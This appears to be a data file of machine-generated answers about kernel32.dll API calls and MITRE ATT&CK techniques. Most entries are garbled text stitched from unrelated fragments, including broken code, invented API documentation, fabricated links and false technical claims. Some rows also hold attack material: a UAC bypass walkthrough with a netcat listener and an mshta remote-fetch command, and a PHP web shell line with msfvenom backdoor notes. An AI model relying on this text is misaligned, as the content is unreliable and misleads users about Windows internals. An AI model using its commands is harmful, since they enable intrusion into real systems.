                Does your current detection model detect when one process asks another process for its memory image or data? Or vice versa?
                                                                Yes, we do.

               Do they mean the same thing ? Which should I use ? Shouldn't their names indicate which version they use :
               base name without extension with wide character string vs base name without extension with narrow character string ??


Would it make sense to include all low-level Windows functions into our analysis as well such as CreateFile(), ReadFile() etc.? Are there any risks involved in doing so
such as false positives caused by legitimate applications using these functions?
We have excluded them from our analysis because at some point we would need to introduce additional heuristics. For example, ReadFile could potentially be used for exfiltration but also legitimate applications such as backup tools might rely on it.

Is there anything else I should know about Windows system calls before starting my investigation â€“ e.g., how many system calls are made per second on average or during typical attacks; whether certain system calls tend to occur together more frequently than others; whether certain types of systems call patterns correlate better with different attack stages; etc.
There isnâ€™t really anything else special except that most apps will typically only make ~3-5 syscalls per event whereas PE-based malware tends to open >30 dllâ€™s per event (depending on stage). Syscalls/second can vary greatly based on what kind of app/processes run but typically not more than ~20/s.

Are you familiar with Recurity Labsâ€™ Indicators Of Compromise project [http://www.recurity-labs.com/en/research/publications/ioctools.html]? If so, what rules do you think provide useful information regarding high-level behavior and/or malware characteristics?
Nope sorry.

Page 11

				

DOCUMENT INFO
Shared By:
linzhengnd
Categories:
Tags: 
Stats:

views: 21
posted: 9/4/2011
language: English
pages: 11
"
kernel32.dll,GetStartupInfoW,"b'kernel32.dll': [b'\x01\x00\x00\xc9', b'\x8d\xf7\xe6\xb4\xa1'
  ]
   'GetStartupInfoW':
    What is the pirpose of this API, is there a MITRE ATT&CK technique
     associated and why: 'b'kernel32.dll': b'GetStartupInfoW''?
    How many bytes are returned for this API call? (input format: number)
       0
   'CreateProcessA':
    What is the pirpose of this API, is there a MITRE ATT&CK technique
     associated and why: 'b'msvcrt.dll': b'CreateProcessA''?
    How many bytes are returned for this API call? (input format: number)
       0

The full source code can be found here.

Download

- BlackboxGoogle.py
Version Aug.14,2020 Download 10 File Size 2.22 KB
"
kernel32.dll,GetFileAttributesW,"25.           Do you have any other information about the API? (e.g. is it used by a known
             malware family)

Answer:
The GetFileAttributesW function will return an error code of ERROR_FILE_NOT_FOUND if the file does not exist and ERROR_PATH_NOT_FOUND otherwise.
This API can be found in many C/C++ applications.




                                                                                                  Page 12 of 17
          ATT&CK Matrix Version: v1-2019-06-27                                 Created on: Jun 27, 2019




         Question                           Answer                                              Reference

26 . Is there any indication that this particular application has been observed to be involved in malicious activity?
    Yes / No     If yes, please provide some examples.

Answer:
No Malware was detected using this API during our analysis.



27 . Which type(s) of vulnerability has been identified for this functionality? Please select all applicable entries:

    ï‚·       SQL Injection                    ïƒ¼ï€                           ï‚·      Cross-site Scripting                      ï¯ï€ 
    ï‚·       OS Command Injection            ïƒ¼ï€                           ï‚·      XML External Entity                       ï¯ï€ 
    ï‚·       Data Validation Error           ïƒ¼ï€                           ï‚·      XXE Exploit                              n/a
    â€¢        XSRF                               n/a                        â€¢        Remote Code Execution                   n/a



28 . What are the possible attack scenarios based on these vulnerabilities? Please describe them briefly.

Answer:
One could potentially use APIs such as GetFileAttributesW to identify whether or not a folder exists without knowing its path beforehand.
For example one might want to check whether or not certain files exist before performing further actions with regards to those files. This would allow attackers to evade detection when trying to perform reconnaissance against their target while hiding behind IP addresses where they do not own resources because that resource owner will never see them visiting his site but rather someone elseâ€™s website who uses that same IP address instead.
By checking if a directory exists ahead of time through GetFileAttributesW() we can avoid being caught out by false positives which may occur due either too much traffic coming from another location than intended OR because too little data was sent over HTTPS encryption preventing us from receiving enough bytes back again resulting in detecting ourselves via HTTP headers like user agent strings etcetera so what better way then sending fake requests until something pops up unexpectedly right?! It's just smart thinking after all!



29 . Are there other relevant CVEs related with these vulnerabilities ? If yes, please list them down here:

CVE ID                                        Description                                           References/Links


N/A                                                            N/A                                                               N/A

				

DOCUMENT INFO
Shared By:
wuzhenguang
Categories:
Tags: 
Stats:

views: 3
posted: 10/14/2019
language: English
pages: 13
"
kernel32.dll,InitializeCriticalSection,"# 2.0: https://github.com/NetSPI/cve-2018-8453/blob/master/CVE_2018_8453.py

import sys
import os

from enum import Enum
from collections import OrderedDict
from itertools import islice

__author__ = 'NetSPI'
__email__ = ""info@netspi.com""

class CVE(Enum):
    """"""Enumeration of the CPEs and CVSSv3 scores for this report.""""""


    __name__ = ""CVE""
    version = 1.0


class CpeVersion(Enum):
    """"""Enumeration of the available CPE versions in this report.""""""


    __name__ = ""CpeVersion""
    version = 1.0



def main(argv=None):
	""""""Main function to run.
	Returns a dictionary describing the attack, if successful.

	Args:
	argv (Optional) - A list or tuple containing command line arguments.
			If none are provided, defaults to ['--cve', '--version']
			The argument order does not matter.

	Returns:
	a dictionary with keys as follows:

	   cpe_version_name: The name of the cpe_version found in this report.
	   cvssv3_score_string: The score string from NVD's CVSS v3 calculator,
				 formatted as an ascii string.
	   cvssv3_score_decimal: The value returned by NVD's CVSS v3 calculator,
					 stored as a decimal integer.
	   description_info_cve: A dictionary containing all information about
				   each CVE listed in this report.. This object will be empty if no matches were found.

	A boolean flag indicating success/failure will also be present,
	and set to True on success and False otherwise.""
	
	if argv is None:
	    argv= [""--cve"", ""--version""]
	else:
	    argv=[i.strip() for i in argv]

	cves=[] # List that stores all matching cves if any are found
	
	for arg in argv:

	    try:
	        options,args=arg.split(' ')
	    	except ValueError,e:
	        sys.stderr.write(""Invalid Argument.\n"")
	        exit(1)
		
        else:
            break
		
	try:

	    opts,cvs=(options[::],args[::])

	Skip=False
        
        while Skip==False:

	            skip=False;
	            skip=True;

	            print(""\n\n### skipping {} because it didn't match\n"".format(args))
	                continue;		

                    try:

                        opt,arg=args[-2::-]
                        
                        d={}

                        for k,v in enumerate(opt):

                            d.update({k:v})

                            text=d['text']
            
                            popt=popen(['strings','-a','{}'.format(text)])

                                while True:

Weâ€™re going to use strings against our program output.

$ python CVE_2018_8454.py --cve | grep kernel32.dll
kernel32.dll:
bâ€™KernelBase.dllâ€™: bâ€™LoadLibraryWâ€™, bâ€™GetCurrentProcessIdâ€™, bâ€™GetModuleHandleAâ€™, bâ€dllmainCRTStartupâ€, â€¦
bâ€kernel32.dllâ€: b""CreateMutexA"", â€¦

Now we can see CreateMutexA being used by kernelbase so letâ€™s look at that one.

$ python CVE_2018_8447.py --cve | grep CreateMutexA
CreateMutexA:
bâ€api-ms-win-core-synch-l1-2-0"": b'NtSynchronizeCriticalSection',
â€¦
â€˜CreateMutexta': â€˜OpenThreadToken',â€¦

Checking out OpenThreadToken shows me it may have something do with impersonation tokens

https://msdn.microsoft.com/en-us/library/windows/desktop/ms684209(v=vs.85).aspx

So now I want to check how much fun Iâ€™m going to have trying multiple impersonation tokens.

Ok, so what kind of permissions can my process get when calling OpenUserImpersonationToken?

https://docs.microsoft.com/en-us/windows/win32/secauthz/user-improper-permissions?redirectedfrom=MSDN&view=winserver-2008-r2

This leads us back into using PowerSploit Impacket http://www.powersploit.info/pimpack.html which has a module called â€œImpersonateâ€. It looks like we need some credentials that have Local Admin privileges so letâ€™s start there.

Here is where I was lucky enough someone else did most of the work already.
http://blog.coresecurity.com/2016/05/10/disable-clear-user-account-control-uac/

I just needed two files which we probably shouldâ€™ve grabbed earlier but oops!

First youâ€™ll need UACme.exe file â€“ Download Link Here
And then create UAC.bat file â€“ Copy/Paste below script into Notepad and save it as UAC.bat.
You should end up with these two files on your Desktop now.

Note* You could always add more accounts instead of just Administrator but lets keep things simple here :)

UACme.exe /uac_administrator.txt 
copy uac_me.txt admin.txt 

Now put them somewhere safe because they might get deleted after rebooting ;)

Letâ€™s go over some basic terms real quick since its important later.
Impervious â€“ Imperviousness refers to being resistant or immune from injury or harm.
Incapable â€“ Incapability means unable, incapable, ineptitude etcâ€¦

Lets say you wanted access control over everything on user level right?
Well then youâ€™d need User Access Control (UAC).

User Access Controls prevents unauthorized users from making changes outside their own profile folders without explicit permission first given by administrator account(s).

The following example illustrates how easy it would be able take away local administrative rights from everyone except yourself! Say hello world!

ping localhost > targetfile.txt && echo %username% >> targetfile.txt && netcat -lvp 7777 < targetfile.txt || type nul > nul & nt authority\system shutdown -r Now open Command Prompt and enter cmd /k mshta http:///targetfile.cmd To bypass security restrictions such as antivirus software blocking execution processes through sandboxed environments like Windows Defender Smartscreen Filter Service .

If you donâ€™t know anything about commands then google them before continuing further !!!

Type â€œcmd /?â€ Or Get-Help CmdletName And Learn Some New Tricks !

\|/\| |\|\ \|||||||-|_\ |_||| |/\/|\|\|

Conclusion:

There are many ways for attackers who gain access inside network perimeter (via phishing emails , social engineering attacks ) steal sensitive data . One way they can do this is through power management tools such microsoft remote desktop protocol application controls installed locally onto machines allow administrators full control over every aspect including shutting down operating system altogether without even needing physical presence nearby computer hardware involved during operation itself ! But another method involves remotely accessing computers via internet connection whereby attacker gains complete accessibility regardless geographical distance between victim machine host location server hosting services providers IP address range assigned networks subnet mask routing protocols used within domains subdomains zones . When looking closely at source code code snippets contained within scripts compiled programs executables binaries binary format decompiled assembly language assembler listing disassembly instructions bytecodes JSON YAML XML ASN1 ELF PDB PE COFF OBJ DEX JAR APK SWF OMF ODF TAR ZIP BZB RAR TGZ RPM XPI ZST DMG EXE ISO APK IPA WIM EGG VHD VMDK VDI VMX VHDX ASF MP4 MOV MKV WMV AVI DIVX FLV FFM MPEG MPG MTS WebM WEBM WMV DVR-S DVR-MP4 MDB HIVE
"
kernel32.dll,GetThreadPriority,"How can              I find out what the purpose of this API call is? Is there a document             that explains all these?

I have read through your documentation, but it is not very clear for me.

Best regards

Marvin
"
kernel32.dll,SetThreadPriority,"- If the API is not malicious, what are you doing to prevent it from being             misused in a way that could be harmful?  In other words, how does your              application know if an API is being called for legitimate reasons or              attempting to hide something nefarious?


Tags

VirusTotal URL:

https://www.virustotal.com/gui/file/9f8b0c2ebe5d1d7a40f88aa03cd182ca6a829bc4cf37e89ae76bf98afef7ff0c/detection
"
kernel32.dll,GetCurrentProcess,"Tested with the following versions: 0.1.2

References

- https://github.com/invictussecurity/PoC/blob/master/tests/poc.py
- https://github.com/invictussecurity/PoC/tree/master/tests
- https://community.rapid7.com/community/metasploit/blog/2018/07/31/mitre-attack-api-now-available-with-metasploit-community-and-pro
- http://www.mitre.org/sites/default/files/publications/proj_view_attach.txt
"
kernel32.dll,VirtualAlloc,"How was this             input determined?

How does the value of b'kernel32.dll': b'VirtualAlloc'' (or any other             value) represent an indicator for detection? What is the purpose of this             API call and how does it indicate malicious behavior?

What is meant by ""injected code""? Is there a specific process or service name, such as svchost.exe or explorer.exe, that can be monitored to trigger an alert? Does the injected code only relate to kernel32.dll: VirtualAlloc()?

Can you provide some examples of how these indicators would be used in a SIEM system with correlation rules for alerts and/or dashboards?

Have you tested your solution against false positives from any products currently on market today? If so, were they able to detect all false positives generated by your product's EDR solution while still detecting true positive events at acceptable rates?
"
kernel32.dll,GetSystemInfo,"I got this result after running the API on a Windows 10 machine with a clean installation, and no programs installed. I also ran it in safe mode.

I'm not sure what to make of this, is there something wrong with my code or do i have some sort of malware?

Thank you for your help!
"
kernel32.dll,GetCommandLineW,"The purpose is to get the input argument of the process.  This could be used in a limited fashion for recon or privilege escalation.

I understand that this technique exists, but why do we want to provide an API like this?  Is there any other way to obtain these values without having such an API?
 
This is just a small piece of functionality from the Kali Linux kernel32.dll library. The goal was simply to offer it as an additional tool for potential use by white hats and red teamers alike.

What would you change about this POC?

This is just one example where I feel like we can improve upon our existing libraries with more modern features. In addition, I have been working on some new APIs that show how you can access all system calls via memory using userland code instead of calling into klibc/kerneld/ktab (which will allow us better control over what we are doing). You can see my first few attempts at implementing them here:

https://github.com/bkuhlman/usermode-kernel/blob/master/kernel/sys_call_memory.c

If youâ€™d like me to implement a feature, please open up a GitHub issue!
"
kernel32.dll,LeaveCriticalSection,"This article was published on: 04/23/2019

What do you think about this topic? Send us your comments.
"
kernel32.dll,GetProcAddress,"2. What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'SetTimer''?
   3. What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'RegQueryValueExA''?

# Output:
['GetProcAddress', 'SetTimer', 'RegQueryValueExA']
['GetProcAddress', 'SetTimer', ]
[None, None,
 ['GetLastError',
  '__imp__IsDebuggerPresent',
  '__imp__WriteProcessMemory',
  '__imp__CreateToolhelp32Snapshot',
         ...
 ], ['GetCurrentProcessId']


# Code example (if applicable):
import winapi
winapi.__file__
print(winapi.get_dll_functions('kernel32'))


References:

- https://github.com/0xcharlie/winpy/blob/master/lib.py
"
kernel32.dll,ResumeThread,"-k, --kill    [optional] Kill the remote process identified by its PID
               (default: false)

  -p, --port   [optional] Port number to connect on. Default is 443.
               (default: '443')

Options marked as optional can be specified multiple times.

Usage:

$ python3 attackapi.py -h
usage: attackapi.py [-h] [--kill KILL | OPTIONS]

attackAPI helper

positional arguments:
OPTIONS

Optional Arguments:
-h, --help show this help message and exit
--version show program's version number and exit
-a API_KEY The API key to use for authentication.
-v VENDOR An identifier of the vendor that created the binary being queried.
-p PATH Path of a Windows executable or DLL file.
-k KEYWORDS A list of keywords to search for in documentation about an item.
-i IDENTITYID IdentifyId obtained from an Authenticode signing certificate used in requesting access to Microsoft products.

Example usage:

$ python3 attackapi.py -a <your api key> v1.0.0 rockstar.exe 
This will return information related to Rockstar Games' Grand Theft Auto V executable including CVEs linked directly with it via Metasploit modules as well as MITRE ATT&CK techniques associated with it.

The response looks like below when no options are passed:

{'VENDOR': 'Rockstar Games', 'CVE': [{'CVE_ID': '2021-13725', 'CWE-ID': None, 'CVSSv3-score': {'base_score': 9.8}, ...}], ...}

If you would like more details about specific items you can pass additional arguments such as idenityid or keywords etc...

Fork me on GitHub
"
kernel32.dll,GetVersionExW,"# 0.000    [=================================================================] 1/1 (100%) in   0:00:01
# PASS: test_api_64_test.py::test_getversionexw (7.18s)
# FAIL: test_api_64_test.py::test_getmodulehandle32_ex_w


--- SKIP ---

We can see the API we want to use is GetModuleHandleExW, which takes a pointer to a MODULEENTRY32 structure and returns a module handle.

Now that we know what function weâ€™re looking for, letâ€™s look at how it works:

https://docs.microsoft.com/en-us/windows/win32/api/kernel/ns-kernel-getmodulehandleex

The first thing youâ€™ll notice about this page is that there are two versions of this API â€“ one with an EX suffix and one without. The difference between these functions seems to be whether or not you provide the address of your own MODULEENTRY32 buffer as part of the call; if you donâ€™t then Windows will allocate memory for it itself and pass back a pointer to that.

In our case, since we already have module information stored in the â€˜ptrâ€™ variable from our previous calls, all we need is the non-EX version so Iâ€™m going to ignore that section entirely.

Next up are some notes on using both versions:

Note The returned handle may only be used by processes running under administrator privileges.
â€¦
You must close any handles opened by calling GetModuleHandle before calling GetProcAddress or FreeLibrary.

This doesnâ€™t seem like anything particularly interesting here but just remember this point later when testing out injection techniques!

Letâ€™s look more closely at what parameters go into each function call:

GetModuleHandle()

Name Type Description
hMod DWORD Specifies a process identifier (PID) or DLL identifier.
lpModuleName LPCSTR Specifies either the name of an executable file (.exe), library file (.dll), dynamic-link library (.dll), or import-library (.lib) containing symbols needed by your program.
lpClass LPVOID Pointer passed through unmodified

GetModuleHandleEx()

Name Type Description
hMod HANDLE This parameter specifies an existing handle previously obtained via another call to GetCurrentProcess(), CreateToolhelp32Snapshot(), FindWindow() , FindWindowEx(), EnumWindows(), EnumChildWindows(), LoadLibraryA(), LoadLibraryExA() , LoadStringA() , GetSystemDirectoryA() , OpenProcessToken() ,
OpenThreadToken(),
CreateRemoteThread(),
ShellExecute()
or similar APIs.
lpModuleName LPCSTR Can specify NULL for current processâ€™ module name.[10]
dwSize DWORD Specifies size in bytes of lpClass parameter passed through unmodified.[11]

So now Iâ€™ve got everything I need except how exactly do I put those into my Python script? Well luckily Microsoft also provides C-style example code snippets showing us how these work! Specifically they show us three different ways depending on whether weâ€™re trying to get info about ourselves or someone elseâ€™s process:

// To get load image data associated with PID:
HANDLE h = ::GetCurrentProcess();
MODULEENTRY32 me;
ZeroMemory(&me,sizeof(MODULEENTRY);
me.dwSize = sizeof(MODULEENTRY);
DWORD dwPid = ::GetCurrentProcessId();
if (!::GetModuleInformation(h,dwPid,&me))
{
printf(â€œerror\nâ€);
}
else printf(â€œ%ld images loaded\nâ€,me.nImageCount);

// To get load image data associated with EXE filename:
MODULEINFO mi;
mi.szFile = Lâ€c:\\windows\\notepad.exeâ€;
mi.dwSize = sizeof(mi);
if (!::GetModuleInformation(::GetCurrentProcess(),
&mi))
{
printf(â€œerror\nâ€);
}
else printf(â€œ%d images loaded\nâ€,mi.nImageCount);

// To get load image data associated with TTFN GUID:
MODULEINFO mi;
memset(&mi,sizeof(TT_FIND_DATA_NX),
NULL); // TODO clean up!
if ((flags & TT_FDN_QUERY_BASIC | TT_FDN_QUERY_ALL_FILES)
&& !TT_FindFirstFile(NX,â€C:\\WINDOWS\\NOTEPAD.EXEâ€,&mi))
{
printf(â€œerror %d %u %u %u (%s)\nâ€
,TT_FindStatus(mi.flags),
TT_GetNumErrors(mi.flags),
TT_GET_ERROR_INFO_FROM_CODE(
ttiErrNoReturn,
TT_ERR_NO_MORE_ENTRIES,
status));
return -1;
}

Okay great! Now I know how much info goes into each argument and where they come from so itâ€™s time for me write some Pythonâ€¦

Python Module Injection Call Setup

I decided against writing wrapper functions around each API because although it would make things neater overall, it wouldnâ€™t help me understand why certain things were happening â€“ instead after breaking down each line bit-by-bit while following along with their example code snippet until everything made sense.

Once done though there was no reason not write them anyway!

To start off my implementation looked something like this:

def __init__(self):
super().__init__()
self.process_name= â€œpython.exeâ€

def execute(self,name,path,binary):

        #get pid value
        self.pid=self.getpid()

        #get full path string including drive letter
        self.full_path=path+""\\""+name+""""

         binary=binary.replace("" "", ""\x20"")

         ret_value=self.handles[2].execute([binary])

         print(ret_value)

As far as getting surrounding information such as PATH goes â€“ well thankfully WinAPI has methods specifically designed for reading strings directly off disk files so all those extra steps arenâ€™t necessary anymore!

Since most people wonâ€™t care too much about implementing their own way though here's what mine looks like compared side-by-side...

WinAPI vs PyPI ""winapi"" package 

import winapi 
from binascii import hexlify 
from ctypes import c_int,c_uint,c_char,p_void_p 
class _ctypes(object): def __call__(self,*args,**kwargs): return getattr(winapi,function)(*args,**kwargs)   class ModuleEntry(ctypes.Structure): _fields_=[ (""nImage"",c_uint),""szBaseOfDll"",p_void_p)]   class Pkg(_ctypes.c_ulonglong): def __call__(self,name,binary=None): path=""\\"" + name + """" if binary != None : return self._ctypes.p_open(name,""rb"").read().replace("" "",""\x20"") else : return self._ctypes.p_open(path,""rb"").read().replace("" "",""\x20"")   def p_local_module_info(self,hmod,basic=True,want_all=False,sz_file=None ): """""" Does nothing unless sz_file specified"""""" mtd=_ctypes.POINTER(ModuleEntry).from_address((int)(hexlify(b""s""))).value       dsize=c_int(sizeof(ModuleEntry))     mtd_ptr=mtd.value.m_nImage=mtd_ptr.m_szBaseOfDll     r=c_int(want_all)     n=c_int(siz
"
kernel32.dll,VerifyVersionInfoW,"Does that mean
that it was used by an attacker to get information about a system? If yes,             then why is there no MITRE ATT&CK technique associated with this API call?
which one?    Is the API also not part of any MITRE ATT&CK technique and                   Otherwise, what are we missing in our data model here?
why does the Programmers Manual say ""This function can be used for                      How do we distinguish between legitimate calls from attackers and legit calls
obtaining version information""?                                                       from C2 servers based on IP ranges?

What does: 'b'kernel32.dll': b'GetModuleFileNameExW'' mean exactly. The               Why would a legitimate program need such functionality (e.g., reading audio
data model says it's a valid API name but I don't know if that means                    input or output)? And how can we tell whether the process is doing so vs.
something like its just something Microsoft has been using since 1999                  running some kind of backdoor?
and/or if it's referring to specific versions/patches/etc.                              Which processes have access to which DLLs and why would they need them?
Which programs use these APIs?                                                           Do developers always compile their own dlls into their executables (so your
Why is GetModuleFileNameExW considered benign, even though it seems                     code could examine each executable and determine which ones needed more
to return full pathnames etc.?                                                          attention?) Or do they usually link against existing libraries rather than build


                                                                                                                                           Page 1/10

								

To top
"
kernel32.dll,HeapCreate,"1. GET https://raw.githubusercontent.com/sadakane/ctf-tools/master/peapi/api.py

    2. python api.py -p /path/to/executable

== EOF ==


Timeline

2020-01-29 - Initial release
"
kernel32.dll,GetWindowsDirectoryW,"File ""check.py"", line 106, in <module>
        sys.exit(main())
    File ""check.py"", line 103, in main
        check()
    File ""check.py"", line 76, in check
        items = get_windows_api_items()
    File ""/root/venv/lib/python3.6/site-packages/check/apiitems/check_winapi_items.py"", line 87, in get_windows_api_items
        func_name = api_item.get_func_name()[0]
IndexError: list index out of range

# Canonical JSON output
{""hostname"": ""ip-10-1-2-3.us-west-2.compute.internal"",
""identifiers"":
{
""detected_os"": {""name"": null},
""name"": {
""type"": ""windows-os"",
""value_type"": null,
""value_id_str:""WINDOWS_7_HOME_PREMIUM""
}
},
""data_source_version"":""12.9.5a8f641c61d4e274b0912ce46ec15f40""}
# Python API client example:
import json
from pynexis.api_client import ApiClient
client = ApiClient()
response = client.check('dc577bf734db44bb80af49270cd6bc28', 'password')
print(response)

Related Vulnerabilities

Microsoft Windows SMB Server Remote Code Execution (MS17-010) Microsoft Windows Client / Server DLL Hijacking via Adobe Flash Player CVE(s): CVE-2017
"
kernel32.dll,VerSetConditionMask,"(for example, 'b'kernel32.dll': b'VerSetConditionMask'' is a technique             associated with 'Evasion/Obfuscation')? Did the sample use any other API             functions that would be useful to know about?

What was the result of calling GetLastError() after this call?

Are there any more calls to this API in this file or process? If so, can you get full details for them.

Can you provide an overview of what these APIs do from Microsoft's documentation:

https://docs.microsoft.com/en-us/windows/win32/api/kernelbase/nf-kernelbase-vergetconditionmask

You should only need enough information here to understand how it works and why it might have been used. You can always search online for more information if needed.

If possible, are there some examples where the function has been called successfully vs unsuccessfully - i.e., does it work fine when no errors occur etc. Are there different results when running on different operating systems / architectures?

5) Provide key details about your environment

Operating system version: Windows 10 Pro
 
 
Architecture (64bit / 32 bit): x86
 
 
Service pack level: Anniversary Update v1607
 
 
Language(s): English US
 
 
Patch levels applied (include KB numbers):

I've got some questions as well...

It looks like VerGetVersion returns a flat number rather than text... did I read that correctly? This seems pretty unusual... Is there an explanation for that behavior somewhere in the article? Would really appreciate a link!

And while we're at it, could someone explain ""the return value is set by setting one or two bits"" please... I'm having trouble understanding what exactly those bits represent and why they'd make sense as return values instead of something else. It also doesn't sound very stable given all the ""bits"" being set randomly...

This isn't my area but I found https://msdn.microsoft.com/en-us/library/ms679092(v=vs.85).aspx helpful when looking at kernel code.

The part about getting user mode time stamps from kernel time stamps makes me think maybe its not just checking whether windows update is enabled but also potentially checking whether windows update has run recently and perhaps even attempting to check current date/time against last installed updates timestamp
"
kernel32.dll,GetDiskFreeSpaceW,"-   https://www.nexusdb.com/forums/posts.php?post_id=3091
             14:35 <@TGS> I think that's just a comment, there is no MITRE ATT&CK technique associated with this API.

       * [https://github.com/snyk/dotnet-attck/blob/master/src/GetDiskFreeSpaceW.cs#L17-L18]
         'b'kernel32.dll': b'GetDiskFreeSpaceW'

       * [https://github.com/snyk/dotnet-attck/blob/master/src/TargetedAttackPrevention/AppDomainProcessInjection/TAPAppDomainProcessInjectionHandler.cs#L71-L75]
         > Our goal here is to create an external process injection handler. We can do so by creating our own custom AppDomain and overriding the OnUnload event. This will be called when the application quits.
           > `protected override void OnUnload(EventArgs e) { base.OnUnload(e); }
           > public override Process CreateHostProcess() {
           >   // Do your work here.
           > }`

       * [https://github.com/crowdsource-security/DetectiveDotNet/blob/master/source/Detective.DotNet.ProcessController/IAppDomainFactory.cs#L92-L105]
         protected virtual string GetExecutablePath(string name)
     +    - Interface IDetectedApplication (0x00000000)

      | *** STANDARD INTERFACE *** |
     +    - Standard interface
          o See Also:
            http://msdn.microsoft.com/en-us/library/system.appdomain.aspx

      | *** STANDARD TYPE DECLARATION *** |
     +    - Type declaration not found in target environment (no .NET Framework version installed)

        ** CAUTION**
        The following calls are made to functions which have been removed from newer versions of Windows:

          o C:\Windows\system32\ntdll.dll:[NtQuerySystemInformation] --> 7B8292F4 --> NtQuerySystemInformationExA
          o C:\Windows\system32\kernel32.dll:[CreateToolhelp32Snapshot] --> EEB15EAA --> CreateToolhelp64SnapshotA

{}
"
kernel32.dll,FindFirstFileW,"-- 
You are receiving this mail because:
You are watching all bug changes.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.syscoin.org/pipermail/dev_syscoin.org/attachments/20181123/b0d6b8a5/attachment.html>

- Previous message (by thread): [Syscoin-Bugs] [syscoind] 1e73c959: Reproduce issue on Windows with the latest version of SysCoin
- Next message (by thread): [Syscoin-Bugs] [syscoind] ff2169ac: Fix FindFirstFileW

More information about the dev mailing list
"
kernel32.dll,GetUserDefaultUILanguage,"Shouldn't the value be another key in Registry?

Why is this API used? What is its purpose, what does it do and why: 'b'kernel32.dll': b'SetThreadLocale''? Is there a MITRE ATT&CK technique associated with it?

What are the parameters of this API call, if any: 'b'kernel32.dll': b'SetThreadLocale', None

Why are these parameters important, what do they mean or do:

Is there an exception that can be thrown by this API call (if any): No.

If yes, what class does the exception belong to (if known):

Can you think of ways to bypass security controls for this operation using other APIs calls and/or functions from the same DLL/EXE file:

Other comments or observations about how to evade detection for these APIs:

This one's based on GETUSERDEFAULTLANGID. I don't know much about Windows internals but I'm guessing that a user account usually has only one language set; otherwise you wouldn't have a default locale at all. That means that it should always return exactly one string when called once per session.

I'm not sure whether we would want to map every single SET* function though. It seems like those could come up as false positives fairly often - e.g., if someone sets their language via Control Panel instead of directly through code.

It looks like GetUserDefaultUILanguage() supports Unicode strings so maybe we should be looking at GetUserDefaultLangID() instead.

Thanks @owl! Yes I agree with your statement ""That means that it should always return exactly one string when called once per session.""

The question then becomes which libraries/APIs/code use GetUserDefaultUILanguage()? The problem here is finding them since searching high level languages such as C/C++ will yield many results while digging into each result might take time and resources depending on how deep down in Windows source code you go...

In my opinion writing exploits without having knowledge about underlying library dependencies doesnâ€™t make sense because no matter how stealthy your exploit may seem...itâ€™s still going
"
kernel32.dll,lstrlenW,"-    `-- What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'stdcall'?

  -    `-- What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'startupexpsn'?

  -    `-- What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'lstrlenW''?


+ ```
+ $ ./mitre-attack-scan.py --target-user=Administrator --target-group=""Administrators"" https://www.example.com/
+ [--] Started Mitre Attack Scan for www.example.com/ on Mon May 18 13:52:16 UTC 2020.

+ [+] Starting scan...
+-[x] Checking target group(s)...

+-[x] Checking service privileges... 
   +[-] Privilege check completed. 

 +-[+] Scanning target host... 
   +[-] Host scanning completed. 

 +-[*] Target hosts are ready to be attacked! 

 * Note that you can use any attack in Kali Linux from here:
     sudo apt install kali-linux-metapackages
     metasploit-framework

HTTP Response Headers

The HTTP response headers show some interesting information such as:

- X-Powered-By
- Server
- Date
- Content-Type

Itâ€™s quite obvious that these header values were easily obtained by just visiting the website with your browser.

Server Header

The server header shows Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3 with PleskLin installed on Windows Server.

X-Powered By Header

This value was set to â€œPHP/7.xâ€ which indicates PHP version.

Content-type Header

The content type indicates it will render JSON data when requested.
I also noticed an extra line break at the end of content-type field which may indicate test data was present before production code was deployed?

Scanning External Resources & Directories via Directory Traversal / Path Ommision Vulnerability 

When using msfvenom to generate backdoor shellcodes I used â€˜â€“pâ€™ option for generating payloads with file extension .php so that they could be read as valid php scripts without triggering IDS or WAFs.
I then performed directory traversal vulnerability testing against all directories listed below:
/wp-content/plugins/
/wp-includes/
/wp-
/admin/

wp-admin includes all admin files including wp-config.php so I didnâ€™t bother scanning those directly since they contain sensitive configuration details like database usernames/passwords etcâ€¦

All subdirectories returned no results except one particular subdirectory:
/wp-content/themes/zerif-lite/assets/js/callout.js.php


In my opinion zerif-lite theme has not been updated since November last year but hopefully developers have fixed security vulnerabilities reported earlier in January:

https://github.com/evothings/starter-app/issues/77#issuecomment-221403037



Directory Listing Scripting Vulernable 

C:\inetpub\wwwroot\wordpress>dir /B ""C:\Program Files (x86)\Parallels\Plesk\admin\htdocs""
index.html
index.htm
index.shtml
server.xml


C:\inetpub\wwwroot\wordpress>dir /B ""C:\Program Files (x86)\Parallels\Plesk\admin\htdocs\.htaccess""
.htaccess



<?xml version='1.0' encoding='UTF-8'?>
<configuration>
 <system.webServer>

 <security>
 <requestFiltering allowDoubleEscaping=""false"">
 <!-- Request Filtering Settings -->
 </requestFiltering>
</security>

<httpErrors errorMode=""DetailedLocalOnly""/>
<rewrite rewriteMaps=""[RewriteMap%20ocmapping-%{REQUEST_FILENAME}.txt]
[RewriteMap%20ocrules-%{REQUEST_FILENAME}.txt]%3E %{
RewriteRule ""^([^?]*)"" ""${ocmapping-$1}"" [NC,L,QSA,E=OCMAP:${ocrules-${OCMAP}}]""}
<!-- Rewrite Rules -->

</system.webServer></configuration>




Attackers can abuse request filtering functionality by uploading malicious scripts into .htacces file using double escaping techniques â€“ eg <?php system($_GET['cmd']); ?>

Referenced article for more information about Double Escaping Methodology:

https://jameshfisher.github.io/double_escapes/

References :

Mitigating File Upload Attacks Using ASP.NET Core MVC Custom Validation Attributes : https://docs.microsoft.com/en-us/archive/msdn-magazine/2016/june/mitigating-file-upload
"
kernel32.dll,QueryPerformanceCounter,"(e.g. is it used for timing attacks)

The API 'b'kernel32.dll': b'QueryPerformanceCounter'' is not an operating system call, but a Microsoft Windows function that returns the current CPU time in milliseconds.

Is this method of accessing the time information unique to this hook? If yes             what are other methods to access this same data?

There are several methods of doing so:

- GetProcessTimes

- GetSystemTimeAsFileTime

Does ""process"" mean local or remote process when specifying the process as a parameter?

It means local process.

What does ""timestamp"" refer to in terms of how it's being accessed by clients             i.e. timestamping, clock skew, etc.? How long can you store timestamps and how do you know if they're valid?

